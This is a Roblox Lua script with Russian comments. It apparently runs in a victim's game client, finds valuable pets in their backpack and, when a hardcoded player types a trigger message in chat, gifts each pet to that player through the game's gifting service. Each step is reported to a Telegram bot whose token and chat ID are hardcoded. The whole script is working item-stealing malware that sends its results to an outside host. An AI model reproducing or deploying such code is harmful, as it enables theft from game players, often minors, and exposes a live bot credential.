local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
print("Игрок:", player.Name)

-- 🔧 НАСТРОЙКИ (ЗАМЕНИТЕ!)
local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE" -- Например: "6123456789:ABC-DEF12345"
local TELEGRAM_CHAT_ID = "7144575011" -- Например: "-1001234567890"
local TARGET_PLAYER = "Rikizigg" -- Ник получателя
local TRIGGER_MESSAGE = "." -- Сообщение-триггер
local DELAY = 2 -- Задержка между действиями

-- 🐾 БЕЛЫЙ СПИСОК ПИТОМЦЕВ
local WHITELIST = {
    "Mythical Egg",
    "Wasp",
    "Tarantula Hawk",
    "Honster"
}

-- 🔎 ПОИСК ПИТОМЦЕВ С ДАННЫМИ
local function getPets()
    local pets = {}
    local backpack = player:FindFirstChild("Backpack") or player.Character
    print("Рюкзак:", backpack:GetFullName())
    
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            print("Найден предмет:", item.Name)
            for _, petName in ipairs(WHITELIST) do
                if item.Name:find(petName) then
                    local weight = item.Name:match("%[(%d+%.%d+) KG%]") or "N/A"
                    local age = item.Name:match("%[Age (%d+)%]") or "N/A"
                    
                    table.insert(pets, {
                        object = item,
                        name = petName,
                        weight = weight,
                        age = age,
                        fullName = item.Name
                    })
                    break
                end
            end
        end
    end
    return pets
end

-- ✋ ВЗЯТЬ ПИТОМЦА В РУКУ
local function equipPet(pet)
    if pet and pet:IsA("Tool") then
        local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid:EquipTool(pet)
            task.wait(DELAY)
            return true
        else
            warn("Нет Humanoid в персонаже!")
        end
    end
    return false
end

-- 📤 ПЕРЕДАТЬ ПИТОМЦА
local function transferPet(pet)
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if not target then
        warn("Целевой игрок не найден!")
        return false
    end

    local PetGiftingService = ReplicatedStorage:FindFirstChild("GameEvents") and 
                            ReplicatedStorage.GameEvents:FindFirstChild("PetGiftingService")
    
    if not PetGiftingService then
        warn("PetGiftingService не найден!")
        return false
    end

    local success = pcall(function()
        PetGiftingService:FireServer("GivePet", target)
    end)
    
    return success
end

-- 📨 ОТПРАВКА В TELEGRAM
local function sendToTelegram(text)
    local url = string.format(
        "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
        TELEGRAM_TOKEN,
        TELEGRAM_CHAT_ID,
        HttpService:UrlEncode(text)
    )
    
    print("Отправляю запрос:", url)
    local success, response = pcall(function()
        return game:HttpGet(url, true)
    end)
    
    if success then
        print("Успешно отправлено! Ответ:", response)
    else
        warn("Ошибка Telegram:", response)
    end
end

-- 🚀 ОСНОВНАЯ ФУНКЦИЯ
local function processTransfer()
    print("\n=== НАЧАЛО ПЕРЕДАЧИ ===")
    local pets = getPets()
    
    if #pets == 0 then
        sendToTelegram("❌ Нет подходящих питомцев")
        return
    end
    
    sendToTelegram("🔄 Начинаю передачу "..#pets.." питомцев...")
    
    for i, pet in ipairs(pets) do
        print("\nПитомец "..i..":", pet.fullName)
        
        -- 1. Берем в руку
        if equipPet(pet.object) then
            print("Взяли в руку:", pet.name)
            
            -- 2. Передаем
            if transferPet(pet.object) then
                local msg = string.format("✅ %s (%.2f кг, %d дн.)", pet.name, pet.weight, pet.age)
                sendToTelegram(msg)
                print("Успешно передано!")
            else
                sendToTelegram("❌ Ошибка передачи: "..pet.name)
                warn("Не удалось передать!")
            end
        else
            sendToTelegram("⚠️ Не взялся в руку: "..pet.name)
            warn("Не взяли в руку!")
        end
        
        task.wait(DELAY)
    end
    
    sendToTelegram("🏁 Всего передано: "..#pets.." питомцев")
    print("=== ПЕРЕДАЧА ЗАВЕРШЕНА ===")
end

-- 👂 ОБРАБОТЧИК ЧАТА
game:GetService("Players").PlayerChatted:Connect(function(chatType, speaker, message)
    if chatType == Enum.PlayerChatType.All and 
       speaker.Name == TARGET_PLAYER and 
       message == TRIGGER_MESSAGE then
        processTransfer()
    end
end)

-- 🏁 ИНИЦИАЛИЗАЦИЯ
print("\n=== СИСТЕМА АКТИВИРОВАНА ===")
print("Ожидаю команду '"..TRIGGER_MESSAGE.."' от", TARGET_PLAYER)
sendToTelegram("🔔 Система готова к работе! Ожидаю команду...")
